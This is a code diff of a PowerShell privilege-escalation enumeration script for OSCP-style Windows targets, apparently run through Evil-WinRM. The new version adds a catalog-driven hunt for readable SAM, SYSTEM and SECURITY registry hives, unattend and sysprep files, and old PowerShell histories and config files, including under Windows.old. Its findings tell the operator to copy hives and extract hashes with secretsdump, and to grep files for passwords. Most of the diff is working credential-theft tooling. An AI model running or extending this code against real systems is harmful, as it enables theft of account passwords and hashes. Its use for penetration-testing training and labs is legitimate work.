@@ -21,7 +21,7 @@ param(
 )
 
 $ErrorActionPreference = "SilentlyContinue"
-$Version = "1.9.7-en-ps"
+$Version = "1.9.8-en-ps"
 # English-first output: reliable under Evil-WinRM / EN-US consoles (Chinese often shows as ???).
 $script:DomainCtx = $null
 $script:AlreadySystem = $false
@@ -762,27 +762,8 @@ function Test-ClassicMisconfigs {
             "autologon"
     }
 
-    $unattend = @(
-        "C:\Windows\Panther\Unattend.xml",
-        "C:\Windows\Panther\Unattended.xml",
-        "C:\Windows\System32\Sysprep\Unattend.xml",
-        "C:\Windows\System32\Sysprep\Panther\Unattend.xml",
-        "C:\Windows\System32\Sysprep\sysprep.xml",
-        "C:\sysprep\sysprep.xml",
-        "C:\sysprep\Unattend.xml",
-        "C:\Windows\Panther\unattend\unattend.xml"
-    )
-    foreach ($p in $unattend) {
-        if (Test-Path -LiteralPath $p) {
-            Add-Finding HIGH "Unattend/Sysprep found: $p" `
-                "Historically often contains local admin or domain passwords." `
-                "dir `"$p`"`nfindstr /ni /i `"password administrator username domain`" `"$p`"" `
-                "unattend:$p"
-        }
-    }
-
-    # --- Hive / SAM+SYSTEM candidates (OSCP classic: Repair, RegBack, Windows.old) ---
-    Test-SamSystemHives
+    # Catalog-driven loot checks (OSCP categories), not ad-hoc path patches.
+    Test-OsLootCatalog
 }
 
 function Test-FileReadableNonEmpty([string]$Path, [int]$MinSize = 16) {
@@ -795,7 +776,6 @@ function Test-FileReadableNonEmpty([string]$Path, [int]$MinSize = 16) {
         $fs.Close()
         return @{ Ok = $true; Len = $len; Why = "readable" }
     } catch {
-        # Some hives allow Read share differently; try read-only open
         try {
             $fs = [System.IO.File]::Open($Path, 'Open', 'Read', 'Read')
             $fs.Close()
@@ -806,119 +786,247 @@ function Test-FileReadableNonEmpty([string]$Path, [int]$MinSize = 16) {
     }
 }
 
-function Test-SamSystemHives {
-    # Fixed classic locations + Windows.old (very common OSCP/HTB path)
-    $candidates = New-Object System.Collections.Generic.List[string]
-    $fixed = @(
-        "C:\Windows\Repair\SAM",
-        "C:\Windows\Repair\SYSTEM",
-        "C:\Windows\Repair\SECURITY",
-        "C:\Windows\System32\config\SAM",
-        "C:\Windows\System32\config\SYSTEM",
-        "C:\Windows\System32\config\SECURITY",
-        "C:\Windows\System32\config\RegBack\SAM",
-        "C:\Windows\System32\config\RegBack\SYSTEM",
-        "C:\Windows\System32\config\RegBack\SECURITY",
-        # Windows.old standard config hives
-        "C:\Windows.old\Windows\System32\config\SAM",
-        "C:\Windows.old\Windows\System32\config\SYSTEM",
-        "C:\Windows.old\Windows\System32\config\SECURITY",
-        "C:\Windows.old\Windows\System32\config\RegBack\SAM",
-        "C:\Windows.old\Windows\System32\config\RegBack\SYSTEM",
-        "C:\Windows.old\Windows\System32\config\RegBack\SECURITY",
-        "C:\Windows.old\Windows\Repair\SAM",
-        "C:\Windows.old\Windows\Repair\SYSTEM",
-        # Some images place hive copies oddly under System32 (seen in labs)
-        "C:\Windows.old\Windows\System32\SAM",
-        "C:\Windows.old\Windows\System32\SYSTEM",
-        "C:\Windows.old\Windows\System32\SECURITY",
-        # lowercase / alternate drive-style leftovers
-        "C:\windows.old\Windows\System32\config\SAM",
-        "C:\windows.old\Windows\System32\config\SYSTEM",
-        "C:\windows.old\Windows\System32\config\SECURITY",
-        "C:\windows.old\windows\System32\config\SAM",
-        "C:\windows.old\windows\System32\config\SYSTEM",
-        "C:\windows.old\windows\System32\config\SECURITY",
-        "C:\windows.old\windows\System32\SAM",
-        "C:\windows.old\windows\System32\SYSTEM",
-        "C:\windows.old\windows\System32\SECURITY"
-    )
-    foreach ($p in $fixed) { [void]$candidates.Add($p) }
-
-    # If Windows.old exists, surface it and search a few more hive names under it
-    $oldRoots = @("C:\Windows.old", "C:\windows.old")
-    foreach ($old in $oldRoots) {
-        if (-not (Test-Path -LiteralPath $old)) { continue }
-        Add-Finding HIGH "Windows.old directory present: $old" `
-            "OS upgrade leftover. Often contains readable SAM/SYSTEM hives or old user profiles with credentials. High-value OSCP path." `
-            "dir `"$old`"`ndir `"$old\Windows\System32\config`"`ndir `"$old\Windows\System32`"`ndir `"$old\Users`"" `
-            "windows_old:$old" `
-            -Priority 96
-
-        # Targeted search for hive file names (depth-limited, name filter only)
-        try {
-            $hiveNames = @('SAM', 'SYSTEM', 'SECURITY', 'SOFTWARE', 'DEFAULT')
-            Get-ChildItem -Path $old -Recurse -File -Depth 6 -ErrorAction SilentlyContinue |
-                Where-Object { $hiveNames -contains $_.Name } |
-                Select-Object -First 30 |
-                ForEach-Object { [void]$candidates.Add($_.FullName) }
-        } catch {}
+function Get-OsLootRoots {
+    # Roots that historically hold credential material on Windows labs/exams.
+    # Design: category-first (upgrade leftovers, install leftovers, backups), not one path after a miss.
+    $roots = New-Object System.Collections.Generic.List[string]
+    foreach ($r in @(
+        # Current OS
+        "C:\Windows",
+        "C:\Windows\System32\config",
+        "C:\Windows\System32\config\RegBack",
+        "C:\Windows\Repair",
+        "C:\Windows\Panther",
+        "C:\Windows\System32\Sysprep",
+        "C:\sysprep",
+        # Upgrade / migration leftovers (OSCP classic)
+        "C:\Windows.old",
+        "C:\windows.old",
+        "C:\`$WINDOWS.~BT",
+        "C:\`$WINDOWS.~WS",
+        # Common backup / admin dump dirs
+        "C:\Backup", "C:\Backups", "C:\backup", "C:\backups",
+        "C:\Temp", "C:\temp", "C:\Windows\Temp",
+        "C:\Users\Public",
+        "C:\inetpub",
+        "C:\PerfLogs"
+    )) {
+        if (Test-Path -LiteralPath $r) { [void]$roots.Add($r) }
     }
-
-    # Also search other common backup folders (shallow)
-    foreach ($root in @("C:\", "C:\Backup", "C:\Backups", "C:\Temp", "C:\Users\Public")) {
-        if (-not (Test-Path -LiteralPath $root)) { continue }
-        try {
-            Get-ChildItem -Path $root -Filter "SAM" -File -ErrorAction SilentlyContinue | ForEach-Object { [void]$candidates.Add($_.FullName) }
-            Get-ChildItem -Path $root -Filter "SYSTEM" -File -ErrorAction SilentlyContinue | ForEach-Object {
-                # avoid live volume named SYSTEM confusion; only small depth
-                if ($_.FullName -match '(?i)\\(config|repair|regback|windows\.old|backup)\\') {
-                    [void]$candidates.Add($_.FullName)
-                }
+    # Any drive-root Windows.old style folders
+    try {
+        Get-PSDrive -PSProvider FileSystem -ErrorAction SilentlyContinue | ForEach-Object {
+            $root = $_.Root  # C:\
+            foreach ($name in @("Windows.old", "windows.old", "Windows.old.000", "Windows.old.001")) {
+                $p = Join-Path $root $name
+                if ((Test-Path -LiteralPath $p) -and -not ($roots -contains $p)) { [void]$roots.Add($p) }
             }
+        }
+    } catch {}
+    return @($roots | Select-Object -Unique)
+}
+
+function Get-HivePathTemplates([string]$WindowsRoot) {
+    # $WindowsRoot examples: C:\Windows  OR  C:\Windows.old\Windows  OR  C:\windows.old\windows
+    $w = $WindowsRoot.TrimEnd('\')
+    return @(
+        "$w\System32\config\SAM",
+        "$w\System32\config\SYSTEM",
+        "$w\System32\config\SECURITY",
+        "$w\System32\config\SOFTWARE",
+        "$w\System32\config\DEFAULT",
+        "$w\System32\config\RegBack\SAM",
+        "$w\System32\config\RegBack\SYSTEM",
+        "$w\System32\config\RegBack\SECURITY",
+        "$w\Repair\SAM",
+        "$w\Repair\SYSTEM",
+        "$w\Repair\SECURITY",
+        # Non-standard lab placements (hive copies left beside System32 tree)
+        "$w\System32\SAM",
+        "$w\System32\SYSTEM",
+        "$w\System32\SECURITY"
+    )
+}
+
+function Get-UnattendPathTemplates([string]$WindowsRoot) {
+    $w = $WindowsRoot.TrimEnd('\')
+    return @(
+        "$w\Panther\Unattend.xml",
+        "$w\Panther\Unattended.xml",
+        "$w\Panther\unattend.xml",
+        "$w\Panther\unattend\unattend.xml",
+        "$w\System32\Sysprep\Unattend.xml",
+        "$w\System32\Sysprep\Unattended.xml",
+        "$w\System32\Sysprep\sysprep.xml",
+        "$w\System32\Sysprep\Panther\Unattend.xml"
+    )
+}
+
+function Test-OsLootCatalog {
+    <#
+    .SYNOPSIS
+      Category-driven credential/loot discovery for OSCP-style Windows boxes.
+    .NOTES
+      Categories (maintain this list when extending - do not only patch one missed path):
+        1) OS upgrade leftovers (Windows.old, $WINDOWS.~BT)
+        2) Registry hive copies (SAM/SYSTEM/SECURITY) under config/Repair/RegBack/odd copies
+        3) Unattend/Sysprep leftovers (current + old Windows trees)
+        4) Old user profile credential artifacts under Windows.old\Users
+        5) Named backup folders (Backup/Temp/Public) for hive filenames
+    #>
+    $candidatesHive = New-Object System.Collections.Generic.List[string]
+    $candidatesUnattend = New-Object System.Collections.Generic.List[string]
+    $oldUserRoots = New-Object System.Collections.Generic.List[string]
+
+    # --- Category 1: upgrade leftovers as first-class roots ---
+    $windowsTrees = New-Object System.Collections.Generic.List[string]
+    if (Test-Path "C:\Windows") { [void]$windowsTrees.Add("C:\Windows") }
+
+    foreach ($old in @("C:\Windows.old", "C:\windows.old")) {
+        if (-not (Test-Path -LiteralPath $old)) { continue }
+        Add-Finding HIGH "OS leftover root present: $old" `
+            "Upgrade/migration leftover. Systematically check old config hives (SAM/SYSTEM), Unattend, and old user profiles. High-value OSCP category." `
+            "dir `"$old`"`ndir `"$old\Windows\System32\config`"`ndir `"$old\Windows\System32`"`ndir `"$old\Users`"`ndir `"$old\Windows\Panther`"" `
+            "loot_oldroot:$old" `
+            -Priority 98
+        foreach ($w in @("$old\Windows", "$old\windows")) {
+            if (Test-Path -LiteralPath $w) { [void]$windowsTrees.Add($w) }
+        }
+        if (Test-Path -LiteralPath "$old\Users") { [void]$oldUserRoots.Add("$old\Users") }
+    }
+    foreach ($bt in @("C:\`$WINDOWS.~BT", "C:\`$WINDOWS.~WS")) {
+        if (Test-Path -LiteralPath $bt) {
+            Add-Finding MED "Windows setup leftover folder: $bt" `
+                "May contain setup logs/unattend fragments. Enumerate carefully." `
+                "dir /s /b `"$bt\*unattend*`" 2>nul`ndir /s /b `"$bt\*sam*`" 2>nul" `
+                "loot_winbt:$bt" -Priority 70
+        }
+    }
+
+    # --- Categories 2+3: expand hive + unattend templates for every Windows tree ---
+    foreach ($wt in ($windowsTrees | Select-Object -Unique)) {
+        foreach ($p in (Get-HivePathTemplates $wt)) { [void]$candidatesHive.Add($p) }
+        foreach ($p in (Get-UnattendPathTemplates $wt)) { [void]$candidatesUnattend.Add($p) }
+    }
+    foreach ($p in @("C:\sysprep\sysprep.xml", "C:\sysprep\Unattend.xml", "C:\sysprep\unattend.xml")) {
+        [void]$candidatesUnattend.Add($p)
+    }
+
+    # Name search under loot roots for hive basenames (depth-capped)
+    $hiveNames = @('SAM', 'SYSTEM', 'SECURITY')
+    foreach ($root in (Get-OsLootRoots)) {
+        if ($root -match '(?i)\\Windows$' -and $root -notmatch '(?i)windows\.old') {
+            # live C:\Windows tree is huge; only search config/repair/regback already in templates
+            continue
+        }
+        try {
+            $depth = if ($root -match '(?i)windows\.old') { 7 } else { 4 }
+            Get-ChildItem -Path $root -Recurse -File -Depth $depth -ErrorAction SilentlyContinue |
+                Where-Object { $hiveNames -contains $_.Name } |
+                Select-Object -First 40 |
+                ForEach-Object { [void]$candidatesHive.Add($_.FullName) }
+        } catch {}
+        try {
+            Get-ChildItem -Path $root -Recurse -File -Depth 5 -ErrorAction SilentlyContinue |
+                Where-Object { $_.Name -match '(?i)^unattend(ed)?\.xml$|^sysprep\.xml$' } |
+                Select-Object -First 20 |
+                ForEach-Object { [void]$candidatesUnattend.Add($_.FullName) }
         } catch {}
     }
 
-    $seen = @{}
-    $readablePairHint = $false
-    foreach ($p in $candidates) {
+    # --- Report Unattend ---
+    $seenU = @{}
+    foreach ($p in $candidatesUnattend) {
         if (-not $p) { continue }
-        $key = $p.ToLowerInvariant()
-        if ($seen.ContainsKey($key)) { continue }
-        $seen[$key] = $true
+        $k = $p.ToLowerInvariant()
+        if ($seenU.ContainsKey($k)) { continue }
+        $seenU[$k] = $true
+        if (-not (Test-Path -LiteralPath $p)) { continue }
+        Add-Finding HIGH "Unattend/Sysprep found: $p" `
+            "Install/sysprep leftovers often store local admin or domain passwords (current OS or Windows.old)." `
+            "dir `"$p`"`nfindstr /ni /i `"password administrator username domain`" `"$p`"" `
+            "unattend:$p" -Priority 94
+    }
+
+    # --- Report hives ---
+    $seenH = @{}
+    $haveSam = $false
+    $haveSystem = $false
+    foreach ($p in $candidatesHive) {
+        if (-not $p) { continue }
+        $k = $p.ToLowerInvariant()
+        if ($seenH.ContainsKey($k)) { continue }
+        $seenH[$k] = $true
 
         $st = Test-FileReadableNonEmpty $p 16
         if (-not $st) { continue }
-
         $base = Split-Path -Leaf $p
+
+        # Live hives under current OS config are usually locked for low-priv; still note in full
+        $isLiveConfig = $p -match '(?i)^[A-Z]:\\Windows\\System32\\config\\(SAM|SYSTEM|SECURITY)$'
+
         if ($st.Ok) {
-            if ($base -match '^(SAM|SYSTEM|SECURITY)$') {
-                $readablePairHint = $true
-            }
+            if ($base -ieq 'SAM') { $haveSam = $true }
+            if ($base -ieq 'SYSTEM') { $haveSystem = $true }
             Add-Finding HIGH "Readable registry hive: $p (size=$($st.Len))" `
-                "File is readable by current user. Offline parse (secretsdump/impacket/samdump2 etc.) can yield local password hashes. Prefer SAM+SYSTEM together." `
-                "dir `"$p`"`nicacls `"$p`"`ncopy `"$p`" `$env:TEMP\`n# Need both SAM and SYSTEM for hash extraction when possible" `
-                "hive_read:$p" `
-                -Priority 97
+                "Readable by current user. Offline hash extraction typically needs SAM + SYSTEM together (e.g. from Windows.old)." `
+                "dir `"$p`"`nicacls `"$p`"`ncopy /y `"$p`" %TEMP%\`n# On attack host: secretsdump.py -sam SAM -system SYSTEM LOCAL" `
+                "hive_read:$p" -Priority 97
         } else {
-            if ($Mode -eq "full" -or ($p -match '(?i)windows\.old' -and $st.Why -ne "tiny")) {
-                Add-Finding INFO "Hive present but not readable: $p (size=$($st.Len); $($st.Why))" `
-                    "Exists but open failed (ACL/lock). Live hives under current Windows\System32\config are often locked." `
-                    "dir `"$p`"`nicacls `"$p`"" `
-                    "hive_locked:$p" `
-                    -Priority 25
-            } elseif ($st.Why -eq "tiny" -and $Mode -eq "full") {
-                Add-Finding INFO "Hive path empty/tiny: $p" "Common empty RegBack stub." "dir `"$p`"" "hive_tiny:$p" -Priority 10
+            if ($isLiveConfig) {
+                if ($Mode -eq "full") {
+                    Add-Finding INFO "Live hive not readable (expected): $p" `
+                        "Current OS hives are usually locked. Prefer Windows.old / Repair / RegBack copies." `
+                        "dir `"$p`"`nicacls `"$p`"" `
+                        "hive_live:$p" -Priority 15
+                }
+            } elseif ($p -match '(?i)windows\.old' -or $Mode -eq "full") {
+                if ($st.Why -ne "tiny") {
+                    Add-Finding INFO "Hive present but not readable: $p (size=$($st.Len); $($st.Why))" `
+                        "Exists but open failed (ACL). Still note the path." `
+                        "dir `"$p`"`nicacls `"$p`"" `
+                        "hive_locked:$p" -Priority 25
+                }
             }
         }
     }
 
-    if ($readablePairHint) {
-        Add-Finding MED "Tip: extract hashes with SAM + SYSTEM pair" `
-            "If you have readable SAM and SYSTEM (e.g. from Windows.old), copy both offline and run secretsdump/samdump style tools on your attack host." `
-            "# Example (attack host): secretsdump.py -sam SAM -system SYSTEM LOCAL" `
-            "hive_pair_tip" `
-            -Priority 80
+    if ($haveSam -and $haveSystem) {
+        Add-Finding HIGH "Readable SAM + SYSTEM pair available" `
+            "You have both hive types readable. Copy offline and extract local account hashes on the attack host." `
+            "# Prefer copies from the same Windows tree (e.g. both under Windows.old)`n# secretsdump.py -sam SAM -system SYSTEM LOCAL" `
+            "hive_pair_ready" -Priority 99
+    } elseif ($haveSam -or $haveSystem) {
+        Add-Finding MED "Partial hive set readable (need SAM + SYSTEM)" `
+            "One of SAM/SYSTEM is readable. Hunt the sibling hive in the same folder tree (especially under Windows.old)." `
+            "dir C:\Windows.old\Windows\System32\config`ndir C:\windows.old\windows\System32" `
+            "hive_pair_partial" -Priority 90
+    }
+
+    # --- Category 4: old user profile artifacts under Windows.old\Users ---
+    foreach ($ur in $oldUserRoots) {
+        try {
+            $hist = Get-ChildItem -Path $ur -Recurse -Filter "ConsoleHost_history.txt" -File -ErrorAction SilentlyContinue |
+                Select-Object -First 15
+            foreach ($h in $hist) {
+                Add-Finding MED "Old profile PowerShell history: $($h.FullName)" `
+                    "Credential clues may survive in Windows.old user profiles." `
+                    "type `"$($h.FullName)`"`nfindstr /ni /i `"password passwd pwd credential`" `"$($h.FullName)`"" `
+                    "old_pshist:$($h.FullName)" -Priority 72
+            }
+        } catch {}
+        try {
+            foreach ($name in @("web.config", ".env", "unattend.xml", "sysprep.xml")) {
+                Get-ChildItem -Path $ur -Recurse -Filter $name -File -Depth 5 -ErrorAction SilentlyContinue |
+                    Select-Object -First 10 |
+                    ForEach-Object {
+                        Add-Finding MED "Interesting file under Windows.old Users: $($_.FullName)" `
+                            "Review for passwords/connection strings." `
+                            "type `"$($_.FullName)`" | more`nfindstr /ni /i `"password connectionString`" `"$($_.FullName)`"" `
+                            "old_userfile:$($_.FullName)" -Priority 68
+                    }
+            }
+        } catch {}
     }
 }
 
@@ -1440,7 +1548,10 @@ function Test-AppConfigInventory {
         "C:\phpstudy_pro", "C:\phpStudy", "C:\www", "C:\wwwroot",
         "C:\Users\Public",
         "$env:USERPROFILE\Desktop",
-        "$env:USERPROFILE\Documents"
+        "$env:USERPROFILE\Documents",
+        # Old OS user trees (loot category, not a one-off path)
+        "C:\Windows.old\Users",
+        "C:\windows.old\Users"
     )) {
         if ($r -and (Test-Path -LiteralPath $r)) { [void]$roots.Add($r) }
     }
